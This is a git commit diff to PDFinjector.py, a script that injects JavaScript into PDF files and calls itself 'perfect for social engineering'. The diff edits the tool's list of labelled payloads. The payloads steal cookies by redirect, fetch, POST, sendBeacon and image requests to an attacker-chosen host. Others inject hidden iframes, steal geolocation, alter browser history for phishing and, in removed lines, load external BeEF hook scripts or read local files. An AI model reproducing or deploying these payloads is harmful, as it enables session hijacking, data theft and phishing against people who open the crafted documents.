68ac3bc5292aebf1da847f36c5d09bcd6a9c5561
Hakil <H4k1l@proton.me>
2025-03-04 23:45:33 +0100

    Update PDFinjector.py

--- PDFinjector.py
+++ PDFinjector.py
@@ -4,7 +4,7 @@ import argparse, execjs, re
 banner = r"""     __     _____ ____  _____
 |--_ /_-| |    ||    \|  __| _  __ _  _    ___  ___  ___  ___  ___
 |  / /  | | |__|| |  ||  __|| || \  || |_ | __|/ __||_ _||   || |_|
-|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.1"""
+|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.0"""
 
 print(banner)
 parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")
@@ -23,24 +23,22 @@ payloads = [
     "console.log('JavaScript is running');", "Classic log",
 
     "alert('XSS!');", "Basic XSS test",
-
-    """document.write('<script src="http://ARGUMENT/ARGUMENT.js"></script>');""", "External script injection, good for the BeEF hook",
-
-    """document.body.appendChild(Object.assign(document.createElement("script"), { src: "http://ARGUMENT/ARGUMENT.js" }));""", "External script injection via appendChild",
-
-    """document.body.innerHTML += '<script src="http://ARGUMENT/ARGUMENT.js"></script>';""", "Silent external script injection, good for the BeEF hook",
+    
+    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding, xss is 'alert('xss')",
 
     """window.location='http://ARGUMENT/ARGUMENT?cookie=' + document.cookie;""", "Cookie theft via redirection",
+    
+    """fetch('http://ARGUMENT/ARGUMENT', { method: 'POST', body: JSON.stringify({ cookie: document.cookie }) });""", "Cookie exfiltration via POST request",
+
+    """navigator.sendBeacon('http://ARGUMENT/ARGUMENT', document.cookie);""", "Send cookie data using Beacon API",
 
     """fetch('http://ARGUMENT/ARGUMENT?cookie=' + document.cookie);""", "Cookie exfiltration via fetch",
 
-    """new Image().src='http://ARGUMENT/ARGUMENT?data=' + document.cookie;""", "Steal data via image request",
-
-    """document.body.innerHTML += '<iframe src="http://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",
-
-    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding, xss is 'alert('xss')",
+    """new Image().src='http://ARGUMENT/ARGUMENT?data=' + document.cookie;""", "Steal Cookie via image request",
 
     """var img = new Image(); img.src = 'http://ARGUMENT/ARGUMENT?data=' + btoa(document.cookie);""", "Data exfiltration via Base64",
+
+    """document.body.innerHTML += '<iframe src="http://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",
 
     """setTimeout("ARGUMENT", 1000);""", "Delayed XSS execution, 'ARGUMENT' is JavaScript code",
 
@@ -53,12 +51,6 @@ payloads = [
     """history.replaceState({}, '', 'http://ARGUMENT');""", "Modify browser history, good for phishing attacks",
 
     """navigator.geolocation.getCurrentPosition(p => fetch('http://ARGUMENT/ARGUMENT?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude));""", "Steal geolocation data",
-
-    """fetch('file:///ARGUMENT').then(response => response.text()).then(data => console.log(data));""", "Try to access local files (Only works in specific contexts)",
-
-    """fetch('http://ARGUMENT/ARGUMENT', { method: 'POST', body: JSON.stringify({ cookie: document.cookie }) });""", "Cookie exfiltration via POST request",
-
-    """navigator.sendBeacon('http://ARGUMENT/ARGUMENT', document.cookie);""", "Send cookie data using Beacon API",
 
     """window.onerror = function(message, source, lineno, colno, error) { fetch('http://ARGUMENT/ARGUMENT?error=' + encodeURIComponent(message)); };""", "Capture JavaScript errors",
 
